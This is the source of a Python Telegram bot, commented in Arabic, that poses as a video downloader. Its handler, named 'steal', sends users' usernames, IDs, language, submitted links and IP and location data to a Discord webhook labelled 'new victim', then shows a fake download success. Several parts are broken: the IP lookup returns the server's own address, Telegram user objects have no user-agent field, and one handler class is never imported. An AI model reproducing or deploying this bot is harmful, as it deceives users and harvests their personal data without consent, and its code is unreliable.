import requests
import re
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ====== الأكواد السرية تُقرأ من متغيرات البيئة ======
TOKEN = os.environ.get('BOT_TOKEN')
DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK')

# ====== التأكد من وجود التوكنات ======
if not TOKEN:
    raise ValueError("❌ لم يتم تعيين BOT_TOKEN في متغيرات البيئة!")
if not DISCORD_WEBHOOK:
    raise ValueError("❌ لم يتم تعيين DISCORD_WEBHOOK في متغيرات البيئة!")

# ====== إرسال البيانات لدسكورد ======
def send_to_discord(user_data):
    try:
        message = (
            f"**🎬 ضحية جديدة!**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"**👤 المعرف:** {user_data.get('username', 'مخفي')}\n"
            f"**🆔 الآيدي:** `{user_data.get('user_id')}`\n"
            f"**🌐 اللغة:** {user_data.get('lang', 'غير معروف')}\n"
            f"**📱 IP العام:** `{user_data.get('ip', 'غير معروف')}`\n"
            f"**📍 الدولة:** {user_data.get('country', 'غير معروف')}\n"
            f"**🏙️ المدينة:** {user_data.get('city', 'غير معروف')}\n"
            f"**📡 المزود:** {user_data.get('isp', 'غير معروف')}\n"
            f"**📱 الجهاز:** {user_data.get('device', 'غير معروف')}\n"
            f"**🔗 الرابط المطلوب:** {user_data.get('url', 'لا يوجد')}\n"
            f"**⏰ الوقت:** {user_data.get('time', 'غير معروف')}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"_تم سحب البيانات بنجاح_ 😈"
        )
        response = requests.post(DISCORD_WEBHOOK, json={"content": message}, timeout=5)
        print(f"✅ تم الإرسال للدسكورد: {response.status_code}")
    except Exception as e:
        print(f"❌ خطأ في الإرسال للدسكورد: {e}")

# ====== استخراج نوع الجهاز من User-Agent ======
def get_device(user_agent):
    if not user_agent:
        return 'غير معروف'
    ua = user_agent.lower()
    if 'iphone' in ua:
        return 'iPhone 📱'
    elif 'android' in ua:
        return 'Android 📱'
    elif 'windows' in ua:
        return 'Windows 💻'
    elif 'mac' in ua:
        return 'Mac 🖥️'
    elif 'linux' in ua:
        return 'Linux 🐧'
    else:
        return 'جهاز غير معروف'

# ====== جلب الـ IP والموقع ======
def get_ip_info():
    try:
        ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip = ip_response.json()['ip']
        
        loc_response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        loc = loc_response.json()
        
        return {
            'ip': ip,
            'country': loc.get('country_name', 'غير معروف'),
            'city': loc.get('city', 'غير معروف'),
            'isp': loc.get('org', 'غير معروف')
        }
    except Exception as e:
        print(f"❌ خطأ في جلب الـ IP: {e}")
        return {
            'ip': 'فشل الجلب',
            'country': 'خطأ',
            'city': 'خطأ',
            'isp': 'خطأ'
        }

# ====== أمر /start ======
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎬 **مرحباً! أنا بوت تحميل المقاطع!**\n"
        "━━━━━━━━━━━━━━━━━\n"
        "📌 أرسل لي رابط مقطع (يوتيوب، تيك توك، انستا)\n"
        "وسأقوم بتحميله لك بجودة عالية وبسرعة!\n\n"
        "🔗 مثال: https://www.youtube.com/watch?v=abc123"
    )

# ====== معالجة الرسائل (سرقة البيانات) ======
async def steal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text
    urls = re.findall(r'https?://[^\s]+', text)
    
    if not urls:
        await update.message.reply_text(
            "❌ أرسل رابط مقطع صحيح!\n"
            "مثال: https://www.youtube.com/watch?v=abc123"
        )
        return
    
    # ====== تجميع البيانات ======
    data = {
        'username': user.username or 'مخفي',
        'user_id': user.id,
        'lang': user.language_code or 'غير معروف',
        'url': urls[0],
        'device': get_device(update.message.from_user.user_agent or ''),
        'time': update.message.date.strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # جلب الـ IP والموقع
    ip_info = get_ip_info()
    data.update(ip_info)
    
    # ====== إرسال كل شيء للدسكورد ======
    send_to_discord(data)
    
    # ====== رد مزيف يخفي الحقيقة ======
    fake_size = f"{len(urls[0]) * 2}.{len(urls[0]) % 10} MB"
    
    await update.message.reply_text(
        f"✅ **تم تحميل المقطع بنجاح!**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📹 الرابط: {urls[0][:50]}...\n"
        f"📁 الحجم: {fake_size}\n"
        f"⏱️ وقت التحميل: 0.{len(urls[0]) % 10} ثانية\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"💡 _نصيحة: استخدم VPN عشان تتفرج بدون تقطيع_ 🤫",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🎬 مشاهدة الآن", url=urls[0])],
            [InlineKeyboardButton("📥 تحميل مباشر", callback_data="fake_download")]
        ])
    )

# ====== زر التحميل المزيف ======
async def fake_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "⚠️ **عذراً!**\n"
        "المقطع محمي بحقوق النشر ولا يمكن تحميله.\n"
        "لكن... شكراً على معلوماتك! 😉\n\n"
        "_هذه كانت تجربة تعليمية عن مخاطر مشاركة الروابط_"
    )

# ====== تشغيل البوت ======
def main():
    print("🚀 البوت شغال...")
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, steal))
    app.add_handler(CallbackQueryHandler(fake_download, pattern="fake_download"))
    
    app.run_polling()

if __name__ == "__main__":
    main()
